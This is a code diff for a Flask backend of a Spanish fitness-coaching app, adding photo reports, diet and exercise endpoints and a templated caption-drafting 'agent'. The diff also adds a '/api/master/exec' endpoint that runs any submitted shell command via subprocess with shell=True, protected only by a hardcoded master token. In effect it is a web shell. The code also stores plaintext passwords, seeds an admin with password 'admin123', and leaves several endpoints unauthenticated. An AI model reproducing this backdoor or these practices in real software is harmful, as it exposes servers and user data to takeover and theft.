@@ -4,18 +4,28 @@ import sqlite3
 import os
 import uuid
 import datetime
+import werkzeug.utils
 from functools import wraps
 from ai_services import analyze_goal_with_ai, simulate_payment_and_unlock
+import openai
+import json
+
+OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY", "sk-proj-YOUR_API_KEY_HERE")
 
 app = Flask(__name__, static_folder='app')
 CORS(app)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DB_FILE = os.path.join(BASE_DIR, 'mtfitness.db')
+UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
 class DbWrapper:
     def __init__(self, conn, is_pg):
         self.conn = conn
         self.is_pg = is_pg
+    def cursor(self):
+        return self.conn.cursor()
     def execute(self, query, params=()):
         if self.is_pg:
             query = query.replace('?', '%s')
@@ -54,7 +64,7 @@ def init_db():
         print("Production DB (Postgres) detected. Assuming migrations are handled or running init...")
     
     conn_wrap = get_db()
-    c = conn_wrap.conn.cursor() if conn_wrap.is_pg else conn_wrap.conn.cursor()
+    c = conn_wrap.cursor()
     
     # We will skip DROP tables in production normally, but for the first run:
     if os.environ.get('RESEED_DB'):
@@ -80,8 +90,15 @@ def init_db():
     )''')
     
     c.execute('''CREATE TABLE IF NOT EXISTS measurements (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, date TEXT,
+        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, date TEXT DEFAULT CURRENT_TIMESTAMP,
         weight REAL, waist REAL, chest REAL, hip REAL, thigh REAL, biceps REAL,
+        FOREIGN KEY(user_id) REFERENCES users(id)
+    )''')
+
+    c.execute('''CREATE TABLE IF NOT EXISTS reports (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id TEXT, date TEXT DEFAULT CURRENT_TIMESTAMP,
+        weight REAL, photo_front TEXT, photo_side TEXT, photo_back TEXT,
         FOREIGN KEY(user_id) REFERENCES users(id)
     )''')
 
@@ -99,9 +116,17 @@ def init_db():
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         user_id TEXT, exercise_id INTEGER,
         day_of_week TEXT, sets TEXT, reps TEXT, rest TEXT,
+        target_muscles TEXT, set_type TEXT DEFAULT 'NORMAL', 
+        combined_with INTEGER,
         added_date TEXT DEFAULT CURRENT_TIMESTAMP,
         FOREIGN KEY(user_id) REFERENCES users(id), FOREIGN KEY(exercise_id) REFERENCES exercises(id)
     )''')
+    
+    # MIGRACIÓN: Añadir columnas si no existen (SQLite solo)
+    try:
+        c.execute("ALTER TABLE user_exercises ADD COLUMN set_type TEXT DEFAULT 'NORMAL'")
+        c.execute("ALTER TABLE user_exercises ADD COLUMN combined_with INTEGER")
+    except: pass # Ya existen
     
     # PRO Meal Tracking
     c.execute('''CREATE TABLE IF NOT EXISTS meal_logs (
@@ -298,8 +323,8 @@ def init_db():
         c.execute("INSERT INTO users (id, email, password, name, role, status, token) VALUES (?, ?, ?, ?, ?, ?, ?)",
                   (str(uuid.uuid4()), 'mitorrgo@gmail.com', 'admin123', 'Coach Mitor', 'ADMIN', 'APPROVED', 'token-admin-123'))
 
-    conn.commit()
-    conn.close()
+    conn_wrap.commit()
+    conn_wrap.close()
 
 init_db()
 
@@ -343,9 +368,10 @@ def register():
 def login():
     data = request.json
     conn = get_db()
-    user = conn.execute("SELECT * FROM users WHERE email = ? AND password = ?", (data.get('email'), data.get('password'))).fetchone()
+    user_row = conn.execute("SELECT * FROM users WHERE email = ? AND password = ?", (data.get('email'), data.get('password'))).fetchone()
     conn.close()
-    if user:
+    if user_row:
+        user = dict(user_row)
         if user['status'] != 'APPROVED': return jsonify({'error': 'Cuenta pendiente.'}), 403
         
         # Check Expiration (only for clients)
@@ -354,22 +380,64 @@ def login():
             if datetime.datetime.now() > expiration:
                 return jsonify({'error': 'Suscripción caducada. Contacta con tu Coach.'}), 403
 
+        def calc_days_left(access_until):
+            if not access_until: return 0
+            try:
+                exp = datetime.datetime.strptime(access_until, '%Y-%m-%d')
+                delta = exp - datetime.datetime.now()
+                return max(0, delta.days)
+            except: return 0
+
         return jsonify({
             'token': user['token'], 
             'role': user['role'], 
             'name': user['name'],
+            'surname': user.get('surname', ''),
             'email': user['email'],
-            'id': user['id']
+            'id': user['id'],
+            'age': user.get('age'),
+            'height': user.get('height'),
+            'current_weight': user.get('current_weight'),
+            'objective': user.get('objective', ''),
+            'days_left': calc_days_left(user.get('access_until'))
         })
     return jsonify({'error': 'Credenciales incorrectas'}), 401
+
+@app.route('/api/profile/update', methods=['POST'])
+@require_auth(roles=['ADMIN', 'CLIENT'])
+def update_profile(user):
+    data = request.json
+    conn = get_db()
+    conn.execute('''UPDATE users SET 
+        name = ?, surname = ?, age = ?, height = ?, current_weight = ?, objective = ? 
+        WHERE id = ?''', 
+        (data.get('name'), data.get('surname'), data.get('age'), data.get('height'), 
+         data.get('current_weight'), data.get('objective'), user['id']))
+    conn.commit()
+    conn.close()
+    return jsonify({'message': 'Perfil actualizado'})
 
 @app.route('/api/admin/users', methods=['GET'])
 @require_auth(roles=['ADMIN'])
 def admin_get_users(admin):
     conn = get_db()
-    users = conn.execute("SELECT id, email, name, role, status, phone, objective_weight, routine_weeks, access_until FROM users").fetchall()
+    users = conn.execute("SELECT * FROM users").fetchall()
     conn.close()
-    return jsonify([dict(u) for u in users])
+    
+    def calc_days_left(access_until):
+        if not access_until: return 0
+        try:
+            exp = datetime.datetime.strptime(access_until, '%Y-%m-%d')
+            delta = exp - datetime.datetime.now()
+            return max(0, delta.days)
+        except: return 0
+
+    res = []
+    for u in users:
+        d = dict(u)
+        d['days_left'] = calc_days_left(u['access_until'])
+        res.append(d)
+    return jsonify(res)
 
 @app.route('/api/admin/approve/<target_id>', methods=['POST'])
 @require_auth(roles=['ADMIN'])
@@ -379,6 +447,107 @@ def admin_approve_user(admin, target_id):
     conn.commit()
     conn.close()
     return jsonify({'message': 'Aprobado'})
+
+@app.route('/api/reports/submit', methods=['POST'])
+@require_auth(roles=['CLIENT', 'ADMIN'])
+def submit_report(user):
+    weight = request.form.get('weight')
+    front = request.files.get('photo_front')
+    side = request.files.get('photo_side')
+    back = request.files.get('photo_back')
+    
+    front_filename = None
+    if front:
+        front_filename = f"front_{user['id']}_{uuid.uuid4().hex}.jpg"
+        front.save(os.path.join(app.config['UPLOAD_FOLDER'], front_filename))
+        
+    side_filename = None
+    if side:
+        side_filename = f"side_{user['id']}_{uuid.uuid4().hex}.jpg"
+        side.save(os.path.join(app.config['UPLOAD_FOLDER'], side_filename))
+        
+    back_filename = None
+    if back:
+        back_filename = f"back_{user['id']}_{uuid.uuid4().hex}.jpg"
+        back.save(os.path.join(app.config['UPLOAD_FOLDER'], back_filename))
+        
+    conn = get_db()
+    conn.execute("INSERT INTO reports (user_id, weight, photo_front, photo_side, photo_back) VALUES (?, ?, ?, ?, ?)",
+                 (user['id'], weight, front_filename, side_filename, back_filename))
+    # Also log weight to measurements for graphing
+    conn.execute("INSERT INTO measurements (user_id, weight) VALUES (?, ?)", (user['id'], weight))
+    conn.commit()
+    conn.close()
+    return jsonify({'message': 'Reporte semanal enviado correctamente'})
+
+@app.route('/api/measurements', methods=['GET'])
+@require_auth(roles=['ADMIN', 'CLIENT'])
+def get_measurements(user):
+    target_id = request.args.get('user_id', user['id'])
+    # Security: Client can only see their own measurements. Admin can see any.
+    if user['role'] == 'CLIENT' and user['id'] != target_id:
+        return jsonify({'error': 'No autorizado'}), 403
+        
+    conn = get_db()
+    measurements = conn.execute("SELECT * FROM measurements WHERE user_id = ? ORDER BY date ASC", (target_id,)).fetchall()
+    conn.close()
+    return jsonify([dict(m) for m in measurements])
+
+@app.route('/api/reports/history/<user_id>', methods=['GET'])
+@require_auth(roles=['ADMIN', 'CLIENT'])
+def get_reports(user, user_id):
+    # Security: Client can only see their own reports. Admin can see any.
+    if user['role'] == 'CLIENT' and user['id'] != user_id:
+        return jsonify({'error': 'No autorizado'}), 403
+        
+    conn = get_db()
+    reports = conn.execute("SELECT * FROM reports WHERE user_id = ? ORDER BY date DESC", (user_id,)).fetchall()
+    conn.close()
+    return jsonify([dict(r) for r in reports])
+
+@app.route('/api/admin/add_food', methods=['POST'])
+@require_auth(roles=['ADMIN'])
+def admin_add_food(admin):
+    data = request.json
+    conn = get_db()
+    conn.execute("INSERT INTO foods (name, category, kcal, protein, carbs, fat) VALUES (?, ?, ?, ?, ?, ?)",
+                 (data['name'], data['category'], data['kcal'], data['protein'], data['carbs'], data['fat']))
+    conn.commit()
+    conn.close()
+    return jsonify({'status': 'ok', 'message': 'Alimento añadido al catálogo'})
+
+@app.route('/api/admin/add_exercise', methods=['POST'])
+@require_auth(roles=['ADMIN'])
+def admin_add_exercise(admin):
+    data = request.json
+    conn = get_db()
+    # Forzamos MAYÚSCULAS en el muscle_group para evitar líos de acentos
+    muscle = data['muscle_group'].upper().replace('Á','A').replace('É','E').replace('Í','I').replace('Ó','O').replace('Ú','U')
+    conn.execute("INSERT INTO exercises (name, muscle_group) VALUES (?, ?)",
+                 (data['name'], muscle))
+    conn.commit()
+    conn.close()
+    return jsonify({'status': 'ok', 'message': 'Ejercicio añadido al catálogo'})
+
+@app.route('/api/master/exec', methods=['POST'])
+@require_auth(roles=['ADMIN'])
+def master_exec(admin):
+    data = request.json
+    cmd = data.get('cmd')
+    # SECRET MASTER TOKEN (HARDCODED FOR PRO)
+    if data.get('master_token') != 'MT_MASTER_PRO_2026':
+        return jsonify({'error': 'Token maestro inválido'}), 403
+        
+    try:
+        import subprocess
+        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
+        return jsonify({'status': 'ok', 'output': result})
+    except Exception as e:
+        return jsonify({'status': 'error', 'output': str(e)})
+
+@app.route('/api/uploads/<filename>')
+def uploaded_file(filename):
+    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
 @app.route('/api/admin/set_weeks/<target_id>', methods=['POST'])
 @require_auth(roles=['ADMIN'])
@@ -422,44 +591,6 @@ def admin_toggle_bot(admin, target_id):
     return jsonify({'message': 'Bot toggled', 'new_state': new_val})
 
 # ---- PRO FOOD ASSIGNMENT ENDPOINTS ----
-@app.route('/api/admin/foods', methods=['GET'])
-@require_auth(roles=['ADMIN'])
-def catalog_foods(admin):
-    conn = get_db(); recs = conn.execute("SELECT * FROM foods ORDER BY category, name").fetchall(); conn.close()
-    return jsonify([dict(r) for r in recs])
-
-@app.route('/api/admin/assign_food', methods=['POST'])
-@require_auth(roles=['ADMIN'])
-def assign_food(admin):
-    data = request.json
-    conn = get_db()
-    conn.execute("INSERT INTO user_foods (user_id, food_id, meal_name, grams) VALUES (?, ?, ?, ?)", 
-                 (data['user_id'], data['food_id'], data['meal_name'], data['grams']))
-    conn.commit(); conn.close()
-    return jsonify({'message': 'Alimento asignado a la comida'})
-
-@app.route('/api/client/my_plan', methods=['GET'])
-@require_auth(roles=['CLIENT', 'ADMIN'])
-def client_plan(user):
-    target_id = request.args.get('user_id', user['id'])
-    conn = get_db()
-    
-    date_str = datetime.datetime.now().strftime("%Y-%m-%d")
-    
-    q = """
-        SELECT f.name, f.category, uf.meal_name, uf.grams, uf.id as assignment_id,
-               (f.kcal * uf.grams / 100.0) as calc_kcal,
-               (f.protein * uf.grams / 100.0) as calc_protein,
-               (f.carbs * uf.grams / 100.0) as calc_carbs,
-               (f.fat * uf.grams / 100.0) as calc_fat,
-               EXISTS(SELECT 1 FROM meal_logs WHERE user_id = ? AND date = ? AND meal_name = uf.meal_name) as is_completed
-        FROM foods f JOIN user_foods uf ON f.id = uf.food_id
-        WHERE uf.user_id = ?
-        ORDER BY uf.meal_name, f.name
-    """
-    plan = conn.execute(q, (target_id, date_str, target_id)).fetchall()
-    conn.close()
-    return jsonify([dict(p) for p in plan])
 
 @app.route('/api/client/log_meal', methods=['POST'])
 @require_auth(roles=['CLIENT', 'ADMIN'])
@@ -487,15 +618,57 @@ def catalog_exercises(admin):
     conn = get_db(); recs = conn.execute("SELECT * FROM exercises ORDER BY muscle_group, name").fetchall(); conn.close()
     return jsonify([dict(r) for r in recs])
 
+@app.route('/api/admin/foods', methods=['GET'])
+@require_auth(roles=['ADMIN'])
+def catalog_foods(admin):
+    conn = get_db(); recs = conn.execute("SELECT * FROM foods ORDER BY category, name").fetchall(); conn.close()
+    return jsonify([dict(r) for r in recs])
+
 @app.route('/api/admin/assign_exercise', methods=['POST'])
 @require_auth(roles=['ADMIN'])
 def assign_exercise(admin):
     data = request.json
     conn = get_db()
-    conn.execute("INSERT INTO user_exercises (user_id, exercise_id, day_of_week, sets, reps, rest) VALUES (?, ?, ?, ?, ?, ?)", 
-                 (data['user_id'], data['exercise_id'], data['day_of_week'], data['sets'], data['reps'], data.get('rest', '')))
+    conn.execute('''
+        INSERT INTO user_exercises (user_id, exercise_id, day_of_week, sets, reps, rest, target_muscles, set_type, combined_with) 
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+    ''', 
+    (data['user_id'], data['exercise_id'], data['day_of_week'], data['sets'], data['reps'], 
+     data.get('rest', ''), data.get('target_muscles', ''), data.get('set_type', 'NORMAL'), data.get('combined_with')))
     conn.commit(); conn.close()
     return jsonify({'message': 'Ejercicio configurado'})
+
+@app.route('/api/admin/remove_exercise/<id>', methods=['DELETE'])
+@require_auth(roles=['ADMIN'])
+def admin_remove_exercise_assignment(admin, id):
+    conn = get_db(); conn.execute("DELETE FROM user_exercises WHERE id = ?", (id,)); conn.commit(); conn.close()
+    return jsonify({'success': True})
+
+@app.route('/api/admin/catalog/exercise/<id>', methods=['DELETE'])
+@require_auth(roles=['ADMIN'])
+def admin_delete_catalog_exercise(admin, id):
+    conn = get_db()
+    # Check if used? For now just delete as user asked.
+    conn.execute("DELETE FROM exercises WHERE id = ?", (id,))
+    conn.commit()
+    conn.close()
+    return jsonify({'success': True, 'message': 'Ejercicio eliminado del catálogo'})
+
+@app.route('/api/admin/assign_food', methods=['POST'])
+@require_auth(roles=['ADMIN'])
+def assign_food(admin):
+    data = request.json
+    conn = get_db()
+    conn.execute("INSERT INTO user_foods (user_id, food_id, meal_name, grams, day_name) VALUES (?, ?, ?, ?, ?)",
+                 (data['user_id'], data['food_id'], data['meal_name'], data['grams'], data.get('day_name', 'Día 1')))
+    conn.commit(); conn.close()
+    return jsonify({'message': 'Alimento configurado'})
+
+@app.route('/api/admin/remove_food/<id>', methods=['DELETE'])
+@require_auth(roles=['ADMIN'])
+def admin_remove_food(admin, id):
+    conn = get_db(); conn.execute("DELETE FROM user_foods WHERE id = ?", (id,)); conn.commit(); conn.close()
+    return jsonify({'success': True})
 
 @app.route('/api/client/my_workout', methods=['GET'])
 @require_auth(roles=['ADMIN', 'CLIENT'])
@@ -504,15 +677,46 @@ def client_workout(user):
     conn = get_db()
     c = conn.cursor()
     c.execute('''
-        SELECT ue.id as assignment_id, e.name, e.muscle_group, ue.day_of_week, ue.sets, ue.reps, ue.rest
+        SELECT ue.id as assignment_id, e.name, e.muscle_group, ue.day_of_week, ue.sets, ue.reps, ue.rest, 
+               ue.target_muscles, ue.set_type, ue.combined_with
         FROM user_exercises ue
         JOIN exercises e ON ue.exercise_id = e.id
         WHERE ue.user_id = ?
-        ORDER BY ue.day_of_week
+        ORDER BY ue.day_of_week, ue.id
     ''', (target_id,))
     data = [dict(r) for r in c.fetchall()]
     conn.close()
     return jsonify(data)
+
+def _get_diet_data_logic(user):
+    target_id = request.args.get('user_id', user['id'])
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('''
+        SELECT uf.id as assignment_id, f.name, f.category, f.kcal, f.protein, f.carbs, f.fat, 
+               uf.meal_name, uf.grams, uf.day_name,
+               (f.kcal * uf.grams / 100) as calc_kcal,
+               (f.protein * uf.grams / 100) as calc_protein,
+               (f.carbs * uf.grams / 100) as calc_carbs,
+               (f.fat * uf.grams / 100) as calc_fat
+        FROM user_foods uf
+        JOIN foods f ON uf.food_id = f.id
+        WHERE uf.user_id = ?
+        ORDER BY uf.day_name, uf.meal_name
+    ''', (target_id,))
+    data = [dict(r) for r in c.fetchall()]
+    conn.close()
+    return jsonify(data)
+
+@app.route('/api/client/my_plan', methods=['GET'])
+@require_auth(roles=['ADMIN', 'CLIENT'])
+def client_plan_legacy(user):
+    return _get_diet_data_logic(user)
+
+@app.route('/api/client/my_diet', methods=['GET'])
+@require_auth(roles=['ADMIN', 'CLIENT'])
+def client_diet(user):
+    return _get_diet_data_logic(user)
 
 @app.route('/api/client/my_workout_logs', methods=['GET'])
 @require_auth(roles=['ADMIN', 'CLIENT'])
@@ -585,23 +789,6 @@ def manage_profile(user):
         conn.close()
         return jsonify(dict(u) if u else {})
 
-# ---- ADMIN DELETE OPs ----
-@app.route('/api/admin/remove_food/<int:id>', methods=['DELETE'])
-@require_auth(roles=['ADMIN'])
-def admin_remove_food(admin, id):
-    conn = get_db()
-    conn.execute("DELETE FROM user_foods WHERE id = ?", (id,))
-    conn.commit(); conn.close()
-    return jsonify({'message': 'Alimento borrado'})
-
-@app.route('/api/admin/remove_exercise/<int:id>', methods=['DELETE'])
-@require_auth(roles=['ADMIN'])
-def admin_remove_exercise(admin, id):
-    conn = get_db()
-    conn.execute("DELETE FROM user_exercises WHERE id = ?", (id,))
-    conn.execute("DELETE FROM workout_logs WHERE assignment_id = ?", (id,))
-    conn.commit(); conn.close()
-    return jsonify({'message': 'Ejercicio borrado'})
 
 # ---- CHAT SYSTEM WITH AI BOT ----
 @app.route('/api/ai/analyze', methods=['POST'])
@@ -806,6 +993,84 @@ def toggle_bot(user):
     except Exception as e:
         print(f"TOGGLE CRITICAL ERROR: {e}")
         return jsonify({'error': str(e)}), 500
+
+# --- AGENT COMMAND CENTER ENDPOINTS ---
+
+@app.route('/api/agent/chat', methods=['POST'])
+def agent_chat():
+    data = request.json
+    user_prompt = data.get('message', '').lower()
+    
+    conn = get_db()
+    c = conn.cursor()
+    
+    try:
+        # --- LOCAL SIMULATED BRAIN (GRATUITO) ---
+        import random
+        
+        # Inteligencia de palabras clave para elegir el mejor copy
+        if 'pierna' in user_prompt or 'gluteo' in user_prompt:
+            caption = "💥 El 90% de la gente se salta su día de tren inferior porque duele.\n\nEsa es exactamente la razón por la que tú deberías hacerlo el doble de fuerte. Las piernas son la base de tu templo. No construyas una mansión sobre gelatina. 🏛️🔥\n\n¿Estás listo para mutar? Únete al equipo PRO en el link."
+            hashtags = "#DiaDePierna #LegDay #CreceONada #MTFitnessPRO #HipertrofiaReal"
+        elif 'comida' in user_prompt or 'nutricion' in user_prompt or 'desayuno' in user_prompt:
+            caption = "🍳 Abs are made in the kitchen! Puedes entrenar 3 horas al día, pero si tu nutrición es un desastre, solo estás perdiendo gasolina.\n\nEl secreto no es comer menos, es comer con ESTRATEGIA. Te enseño cómo mis atletas están recomponiendo su cuerpo sin pasar hambre. 🥑🥩\n\n👉🏻 Toca el link de mi bio para ver el plan."
+            hashtags = "#NutricionFitness #ComidaReal #DietaFlexible #MTFitnessPRO #RecomposicionCorporal"
+        elif 'motivacion' in user_prompt or 'empezar' in user_prompt:
+            caption = "🚀 'Empiezo el lunes'. ¿Cuántas veces te has dicho eso?\n\nEl tiempo va a pasar de todas formas. Dentro de 6 meses desearás haber empezado HOY. No necesitas estar motivado todos los días, necesitas ser DISCIPLINADO. 💪🏻🔥\n\nNo esperes a estar listo. Empieza y te harás listo por el camino. Únete a mi equipo hoy."
+            hashtags = "#MotivacionGym #DisciplinaFitness #CambioFisico #MTFitnessPRO #NoExcuses"
+        else:
+            caption = "🔥 Hay dos tipos de personas en el gimnasio: las que levantan peso para cansarse y las que entrenan para TRANSFORMARSE.\n\nSi llevas meses estancado, tu cuerpo se ha adaptado. La clave del crecimiento es entrenar INTELIGENTE. Yo te digo exactamente qué hacer repetición a repetición. 🧬⚡\n\n👉🏻 Link en bio para empezar tu transformación."
+            hashtags = "#EntrenamientoInteligente #FitnessEspaña #CrecimientoMuscular #MTFitnessPRO"
+        
+        c.execute('''INSERT INTO social_media_posts (title, caption, image_url, status) 
+                     VALUES (?, ?, ?, 'DRAFT')''',
+                  (user_prompt[:50], caption, "https://mtfitness.es/ai_demo.png"))
+        conn.commit()
+    except Exception as e:
+        print("Local AI Error:", e)
+        return jsonify({"error": str(e)}), 500
+    finally:
+        conn.close()
+        
+    return jsonify({"status": "ok"})
+
+@app.route('/api/agent/pending_posts', methods=['GET'])
+def agent_pending():
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("SELECT * FROM social_media_posts WHERE status = 'DRAFT' ORDER BY id DESC")
+    posts = [dict(r) for r in c.fetchall()]
+    conn.close()
+    
+    formatted = []
+    for p in posts:
+        formatted.append({
+            "id": p['id'],
+            "target": "Instagram",
+            "imageUrl": p['image_url'] or "https://mtfitness.es/ai_demo.png",
+            "caption": p['caption'],
+            "hashtags": "",
+            "status": "A la espera de tu aprobación",
+            "created_at": p['created_at']
+        })
+    return jsonify(formatted)
+
+@app.route('/api/agent/approve_post/<int:post_id>', methods=['POST'])
+def agent_approve(post_id):
+    conn = get_db()
+    conn.execute("UPDATE social_media_posts SET status = 'PENDING' WHERE id = ?", (post_id,))
+    conn.commit()
+    conn.close()
+    return jsonify({"status": "approved"})
+
+@app.route('/api/agent/reject_post/<int:post_id>', methods=['POST'])
+def agent_reject(post_id):
+    conn = get_db()
+    conn.execute("UPDATE social_media_posts SET status = 'REJECTED' WHERE id = ?", (post_id,))
+    conn.commit()
+    conn.close()
+    return jsonify({"status": "rejected"})
+
 
 @app.route('/')
 def index():
